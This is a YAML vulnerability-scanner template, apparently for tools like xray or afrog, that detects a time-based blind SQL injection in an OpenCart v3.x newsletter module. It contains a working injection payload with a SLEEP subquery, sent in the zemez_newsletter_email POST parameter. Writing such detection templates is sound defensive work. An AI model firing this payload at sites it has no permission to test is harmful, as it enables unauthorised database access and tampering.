id: OpenCart-v3.x-Newsletter-Module-Blind-SQLi

info:
  name: OpenCart v3.x Newsletter Module - Blind SQLi
  author: Saud Alenazi
  severity: critical
  description: Opencart允许通过/index.php中的参数“zemez_Newsletter_email”进行SQL注入？route=extension/module/zemez_newsletter/addNewsletter。利用此问题，攻击者可以危害应用程序、访问或修改数据，或利用底层数据库中的潜在漏洞。
  reference:
    - https://www.exploit-db.com/exploits/50942

set:
  sleepSecond: randomInt(4, 6)
rules:
  r0:
    request:
      method: POST
      path: /index.php?route=extension/module/zemez_newsletter/addNewsletter
      headers:
        Cookie: OCSESSID=aaf920777d0aacdee96eb7eb50
      body: |
        zemez_newsletter_email=saud%' AND (SELECT 5968 FROM (SELECT(SLEEP({{sleepSecond}})))yYJX) AND 'yJkK%'='yJkK
    expression: response.latency >= sleepSecond
expression: r0()